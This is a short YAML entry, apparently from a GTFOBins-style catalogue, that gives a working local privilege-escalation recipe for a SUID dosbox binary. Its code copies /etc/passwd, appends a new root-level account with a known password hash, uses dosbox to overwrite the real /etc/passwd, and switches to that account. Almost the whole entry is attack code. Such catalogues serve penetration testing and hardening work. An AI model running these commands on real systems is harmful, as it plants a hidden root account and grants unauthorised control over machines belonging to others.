---
functions:
  SUID:
    - description: Please change username to whatever you want and passwod is `toor`.
      code: |
		cp /etc/passwd /tmp/passwd
		echo "idealphase:sXuCKi7k3Xh/s:0:0::/root:/bin/bash" >> /tmp/passwd
		/usr/bin/dosbox -c "mount c /etc/" -c "mount d /tmp/" -c "d:" -c "copy passwd c:"
		su idealphase
---
